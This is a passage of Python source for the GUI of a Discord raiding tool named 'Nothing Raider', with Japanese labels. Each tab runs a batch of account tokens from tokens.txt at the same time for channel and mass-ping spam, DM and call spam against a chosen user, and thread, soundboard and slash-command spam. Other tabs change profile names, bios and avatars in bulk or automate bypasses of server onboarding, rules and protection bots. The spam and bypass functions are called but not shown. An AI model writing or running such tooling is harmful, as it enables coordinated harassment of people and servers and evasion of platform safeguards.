    react_button = ctk.CTkButton(frame, text="リアクション", command=lambda: threading.Thread(target=react_to_message, args=(channel_entry.get(), message_entry.get(), emoji_entry.get())).start())
    react_button.pack(pady=20)

def fake_typer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    
    channel_label = ctk.CTkLabel(frame, text="ChannelIDを入力してください:")
    channel_label.pack(pady=5)
    
    channel_entry = ctk.CTkEntry(frame, width=250)
    channel_entry.pack(pady=5)
    
    def start_fake_typers():
        global threads
        global stop_event

        channel_id = channel_entry.get().strip()
        if not channel_id:
            tkinter.messagebox.showerror("エラー", "Channel IDを入力してください。")
            return
        stop_event.clear()
        for token in tokens:
            thread = threading.Thread(target=fake_typer, args=(channel_id, token))
            threads.append(thread)
            thread.start()
    
    def stop_fake_typers():
        global threads
        global stop_event

        stop_event.set()
        for thread in threads:
            thread.join() 
        threads = []
        print("Fake Typerを止めました")

    fake_typer_button = ctk.CTkButton(frame, text="Fake Typer開始", command=start_fake_typers)
    fake_typer_button.pack(pady=5)

    stop_button = ctk.CTkButton(frame, text="停止", command=stop_fake_typers)
    stop_button.pack(pady=5)

def all_channel_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    server_label = ctk.CTkLabel(frame, text="GuildID")
    server_label.pack(pady=5)
    server_entry = ctk.CTkEntry(frame)
    server_entry.pack(pady=5)
    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=500, height=300)
    message_entry.pack(pady=5)
    all_spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=all_channel_spam, args=(server_entry.get(), message_entry.get("1.0", "end-1c"))).start())
    all_spam_button.pack(pady=5)
    all_spam_stop_button = ctk.CTkButton(frame, text="Stop", command=stop_all_channel_spam)
    all_spam_stop_button.pack(pady=0)

def text_random_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    text_spam_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=custom_spammer, args=(channel_entry.get(),)).start())
    text_spam_button.pack(pady=20)
    stop_text_spam_button = ctk.CTkButton(frame, text="Stop", command=lambda: threading.Thread(target=stop_custom_spammer, args=(channel_entry.get(),)).start())
    stop_text_spam_button.pack(pady=0)

def bot_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame)
    channel_entry.pack(pady=5)
    bot_button = ctk.CTkButton(frame, text="Start", command=lambda: howbot(channel_entry.get()))
    bot_button.pack(pady=20)

def onliner_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    onliner_button = ctk.CTkButton(frame, text="Onliner", command=lambda: threading.Thread(target=change_status_wrapper()).start())
    onliner_button.pack(pady=20)

def change_status_wrapper():
    tokens = read_tokens('tokens.txt')
    for token in tokens:
        threading.Thread(target=change_status, args=(token,)).start()

def stop_spammer():
    global spamming
    spamming = False

# GUI部分（マスピングオプション追加）
def new_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    # Channel ID
    channel_label = ctk.CTkLabel(frame, text="Channel ID")
    channel_label.pack(pady=0)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=0)

    # Guild ID（マスピング用）
    guild_label = ctk.CTkLabel(frame, text="Guild ID (Mass pingを使う場合は必要)")
    guild_label.pack(pady=0)
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=0)

    # Message
    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=0)
    message_entry = ctk.CTkTextbox(frame, width=500, height=200)
    message_entry.pack(pady=0)

    # マスピングオプション
    mass_ping_var = ctk.BooleanVar(value=False)
    mass_ping_check = ctk.CTkCheckBox(frame, text="Mass Pingを有効にする", variable=mass_ping_var)
    mass_ping_check.pack(pady=0)

    ping_count_label = ctk.CTkLabel(frame, text="メンション数 (1-10)")
    ping_count_label.pack(pady=0)
    ping_count_entry = ctk.CTkEntry(frame, width=100)
    ping_count_entry.insert(0, "3")  # デフォルト値
    ping_count_entry.pack(pady=0)

    # Start/Stopボタン
    start_button = ctk.CTkButton(frame, text="Start", command=lambda: threading.Thread(target=spammer, args=(
        channel_entry.get(),
        message_entry.get("1.0", "end-1c"),
        guild_entry.get(),
        mass_ping_var.get(),
        int(ping_count_entry.get() or 0)
    )).start())
    start_button.pack(pady=5)

    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
    stop_button.pack(pady=5)

def command_spammer_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    # Guild ID
    guild_label = ctk.CTkLabel(frame, text="Guild ID")
    guild_label.pack(pady=5)
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    # Channel ID
    channel_label = ctk.CTkLabel(frame, text="Channel ID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=5)

    # Application ID
    app_label = ctk.CTkLabel(frame, text="Application ID")
    app_label.pack(pady=5)
    app_entry = ctk.CTkEntry(frame, width=400)
    app_entry.pack(pady=5)

    # Command Name
    command_label = ctk.CTkLabel(frame, text="コマンド名")
    command_label.pack(pady=5)
    command_entry = ctk.CTkEntry(frame, width=400)
    command_entry.pack(pady=5)

    # Startボタン
    def start_spamming():
        guild_id = guild_entry.get()
        channel_id = channel_entry.get()
        application_id = app_entry.get()
        command_name = command_entry.get()
        session_id = str(uuid.uuid4())  # UUID4でsession_idを生成

        # 最初のトークンを使用してcommand_idを取得
        command_id = get_command_id(tokens[0], guild_id, application_id, command_name)
        if command_id:
            threading.Thread(
                target=slash_command_spammer,
                args=(guild_id, channel_id, application_id, command_id, command_name, session_id, tokens)
            ).start()
        else:
            print("Failed to retrieve command_id.")

    start_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    start_button.pack(pady=5)

    # Stopボタン
    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spammer)
    stop_button.pack(pady=5)
    
def change_global_name_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    
    name_label = ctk.CTkLabel(frame, text="ユーザー名チェンジャー (nick.txtからランダムに)")
    name_label.pack(pady=5)
    
    def start_name_changer():
        with open("tokens.txt", "r", encoding="utf-8") as token_file:
            tokens = token_file.read().splitlines()
        
        try:
            with open("nick.txt", "r", encoding="utf-8") as nick_file:
                names = nick_file.read().splitlines()
        except UnicodeDecodeError:
            print("nick.txtが読み取れません。")
            return
        
        for token in tokens:
            random_name = random.choice(names)
            threading.Thread(target=change_global_name, args=(token, random_name)).start()
    
    change_name_button = ctk.CTkButton(frame, text="表示名を変更", command=start_name_changer)
    change_name_button.pack(pady=20)

def info(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    Loaded_Tokenlabel = ctk.CTkLabel(frame, text=f"読み込まれたtoken {token_count}個")
    Loaded_Tokenlabel.pack(pady=5)
    label1 = ctk.CTkLabel(frame, text="Ver - Release v2")
    label1.pack(pady=5)
    label2 = ctk.CTkLabel(frame, text="Note - Capsolverはメンテナンス中のため、Discordでは使用できません。")
    label2.pack(pady=5)
    label3 = ctk.CTkLabel(frame, text="Update - バグの修正")
    label3.pack(pady=5)
    label4 = ctk.CTkLabel(frame, text="Update - Format Changer追加したよ")
    label4.pack(pady=5)

def open_dm_spam_tab(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    warn_label = ctk.CTkLabel(frame, text="このオプションはtokenの寿命を非常に削ります。注意して使用してください。")
    warn_label.pack(pady=5)
    user_id_label = ctk.CTkLabel(frame, text="User ID")
    user_id_label.pack(pady=5)
    user_id_entry = ctk.CTkEntry(frame, width=200)
    user_id_entry.pack(pady=5)

    message_label = ctk.CTkLabel(frame, text="メッセージ")
    message_label.pack(pady=5)
    message_entry = ctk.CTkTextbox(frame, width=400, height=150)
    message_entry.pack(pady=5)

    dm_spam_var = ctk.IntVar()
    call_spam_var = ctk.IntVar()

    dm_spam_checkbox = ctk.CTkCheckBox(frame, text="DM Spam", variable=dm_spam_var)
    dm_spam_checkbox.pack(pady=5)

    call_spam_checkbox = ctk.CTkCheckBox(frame, text="Call Spam", variable=call_spam_var)
    call_spam_checkbox.pack(pady=5)

    def start_spamming():
        global stop_spamming
        stop_spamming = False
        user_id = user_id_entry.get().strip()
        message = message_entry.get("1.0", "end-1c").strip()
        dm_spam = dm_spam_var.get()
        call_spam = call_spam_var.get()

        if not user_id:
            tkinter.messagebox.showwarning("Error", "ユーザーIDが指定されていません。")
            return

        if not dm_spam and not call_spam:
            tkinter.messagebox.showwarning("Error", "どちらか選択してください。")
            return
        
        tokens = read_tokens('tokens.txt')

        for token in tokens:
            thread = threading.Thread(target=open_dm_and_spam, args=(user_id, message, dm_spam, call_spam, token))
            thread.start()

    def stop_spamming_fn():
        global stop_spamming
        stop_spamming = True

    spam_button = ctk.CTkButton(frame, text="Start", command=start_spamming)
    spam_button.pack(pady=10)

    stop_button = ctk.CTkButton(frame, text="Stop", command=stop_spamming_fn)
    stop_button.pack(pady=10)

def start_vc_joining(tokens, guild, channel):
    threads = []
    for token in tokens:
        thread = threading.Thread(target=vc_joiner, args=(token, guild, channel))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def start_soundboard_spam(link):
    if not link.startswith("https://discord.com/channels/"):
        print("Invalid channel link")
        return

    channel_id = link.split("/")[5]
    guild_id = link.split("/")[4]

    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    for token in tokens:
        threading.Thread(target=vc_joiner, args=(token, guild_id, channel_id)).start()
        threading.Thread(target=soundboard, args=(token, channel_id)).start()

def vc_joiner_ui(frame):
    link_label = ctk.CTkLabel(frame, text="Channel Link")
    link_label.pack(pady=10)
    link_entry = ctk.CTkEntry(frame, width=400)
    link_entry.pack(pady=10)
    start_button = ctk.CTkButton(frame, text="Start Soundboard Spam", command=lambda: start_soundboard_spam(link_entry.get()))
    start_button.pack(pady=20)

def start_onboarding_bypass_ui(guild_id_entry):
    guild_id = guild_id_entry.get()
    start_onboarding_bypass(guild_id)

def onboarding_bypass_tab(tab_frame):
    ctk.CTkLabel(tab_frame, text="Onboarding Bypass").pack(pady=10)
    guild_id_entry = ctk.CTkEntry(tab_frame, placeholder_text="Guild IDを入力", width=250)
    guild_id_entry.pack(pady=5, padx=5)
    start_button = ctk.CTkButton(tab_frame, text="Start", command=lambda: start_onboarding_bypass_ui(guild_id_entry))
    start_button.pack(pady=10)

def bio_changer_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    title_label = ctk.CTkLabel(frame, text="Bio Changer", font=("Arial", 20))
    title_label.pack(pady=10)

    bio_entry = ctk.CTkTextbox(frame, width=400, height=150)
    bio_entry.pack(pady=5)

    result_label = ctk.CTkLabel(frame, text="")
    result_label.pack(pady=5)

    def apply_bio_changes():
        bio = bio_entry.get("1.0", "end-1c")
        if not bio:
            result_label.configure(text="Bio cannot be empty.")
            return

        try:
            with open("tokens.txt", "r") as f:
                tokens = f.read().splitlines()
        except Exception as e:
            result_label.configure(text=f"Error reading tokens: {e}")
            return

        results = []
        results_lock = threading.Lock()

        def worker(token):
            try:
                result = bio_changer(token, bio)
                with results_lock:
                    results.append(result)
            except Exception as e:
                with results_lock:
                    results.append(f"Error with token {token}: {e}")

        threads = []
        for token in tokens:
            thread = threading.Thread(target=worker, args=(token,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    apply_button = ctk.CTkButton(frame, text="Apply Bio Change", command=apply_bio_changes)
    apply_button.pack(pady=10)

def bedrockbypassui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="GuildID(サーバーid)")
    guild_label.pack(pady=5)
    
    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    def on_bypass_click():
        guild_id = guild_entry.get().strip()
        if not guild_id:
            tkinter.messagebox.showerror("入力ミス", "GuildIDが空です。")
            return

        def process_token_multithreaded(token):
            try:
                bypassBedrock(guild_id, token)
            except ValueError as e:
                tkinter.messagebox.showerror("エラー", f"正しくないGuildID: {e}")

        def process_all_tokens():
            threads = []
            for token in tokens:
                thread = threading.Thread(target=process_token_multithreaded, args=(token,))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        threading.Thread(target=process_all_tokens).start()

    bypass_button = ctk.CTkButton(frame, text="Bypass Bedrock", command=on_bypass_click)
    bypass_button.pack(pady=5)

def rule_bypass_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    guild_label = ctk.CTkLabel(frame, text="GuildID")
    guild_label.pack(pady=5)

    guild_entry = ctk.CTkEntry(frame, width=400)
    guild_entry.pack(pady=5)

    def on_bypass_click():
        guild_id = guild_entry.get().strip()
        if not guild_id:
            tkinter.messagebox.showerror("入力に誤りがあります", "GuildIDが正しくありません。")
            return

        for token in tokens:
            threading.Thread(target=rule_bypass, args=(token, guild_id)).start()

    newspam_button = ctk.CTkButton(frame, text="Rule bypass", command=on_bypass_click)
    newspam_button.pack(pady=5)

def avatar_changer_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    status_label = ctk.CTkLabel(frame, text="Avatar changer(先にonlinerを実行)")
    status_label.pack(pady=5)

    def on_avatar_change_click():


        threading.Thread(target=start_avatar_change_threads()).start()

    avatar_button = ctk.CTkButton(frame, text="Change Avatar", command=on_avatar_change_click)
    avatar_button.pack(pady=5)

def run_button_bypass(message_id, channel_id, guild_id, optionbutton):
    with open("tokens.txt", "r") as f:
        tokens = f.read().splitlines()

    for token in tokens:
        button_bypass(token, message_id, channel_id, guild_id, optionbutton)

def button_pusher_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()

    message_label = ctk.CTkLabel(frame, text="メッセージリンク")
    message_label.pack(pady=5)

    message_entry = ctk.CTkEntry(frame, width=400)
    message_entry.pack(pady=5)

    option_label = ctk.CTkLabel(frame, text="どこのボタンを押すか(左から何番目か)")
    option_label.pack(pady=5)

    option_entry = ctk.CTkEntry(frame, width=400)
    option_entry.pack(pady=5)

    def on_button_click():
        message_link = message_entry.get().strip()
        button_option = option_entry.get().strip()

        if not message_link:
            tkinter.messagebox.showerror("入力に誤りがあります", "Message Linkを入力してください。")
            return

        if not message_link.startswith("https://"):
            tkinter.messagebox.showerror("入力に誤りがあります", "URLの形式が正しくありません。")
            return

        parts = message_link.split("/")
        if len(parts) < 7:
            tkinter.messagebox.showerror("入力に誤りがあります", "URLの構造が正しくありません。")
            return

        guild_id = parts[4]
        channel_id = parts[5]
        message_id = parts[6]

        if not button_option:
            button_option = 0
        else:
            button_option = int(button_option)

        try:
            with open('tokens.txt', 'r') as file:
                tokens = [line.strip() for line in file.readlines() if line.strip()]
        except Exception as e:
            print(f"tokenの読み込みに失敗|{e}")
            return

        max_workers = len(tokens)
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)

        futures = [executor.submit(button_bypass, token, message_id, channel_id, guild_id, button_option) for token in tokens]

        concurrent.futures.wait(futures)

    button_push_button = ctk.CTkButton(frame, text="Button Pusher", command=on_button_click)
    button_push_button.pack(pady=5)

def thread_spam_ui(frame):
    for widget in frame.winfo_children():
        widget.destroy()
    fdsa = ctk.CTkLabel(frame, text="スレッドspammer|すぐレートリミットなります。")
    fdsa.pack(pady=5)
    channel_label = ctk.CTkLabel(frame, text="ChannelID")
    channel_label.pack(pady=5)
    channel_entry = ctk.CTkEntry(frame, width=400)
    channel_entry.pack(pady=5)
    label1 = ctk.CTkLabel(frame, text="スレッドの名前")
    label1.pack(pady=5)
    name_entry = ctk.CTkEntry(frame, width=400)
    name_entry.pack(pady=5)

    def on_spam_click():
        channel_id = channel_entry.get().strip()
        name = name_entry.get().strip()
        if not channel_id:
            tkinter.messagebox.showerror("入力に誤りがあります", "ChannelIDが正しくありません。")
            return

        for token in tokens:
            threading.Thread(target=thread_spam, args=(token, channel_id, name)).start()

    spam_button = ctk.CTkButton(frame, text="Thread Spam", command=on_spam_click)
    spam_button.pack(pady=5)


# Example usage
if __name__ == "__main__":
    file_pathy = "format.txt"



if __name__ == "__main__":
    root = ctk.CTk()  
    iconfile = 'asset/icon.ico'
    root.iconbitmap(default=iconfile)
    root.title(f"Nothing Raider | Loaded {token_count} tokens")
    root.geometry("900x500")
    os.system('cls')
    print("キーレスバージョンだから認証ないヨ。")
    switch_to_main_ui()
    root.mainloop()
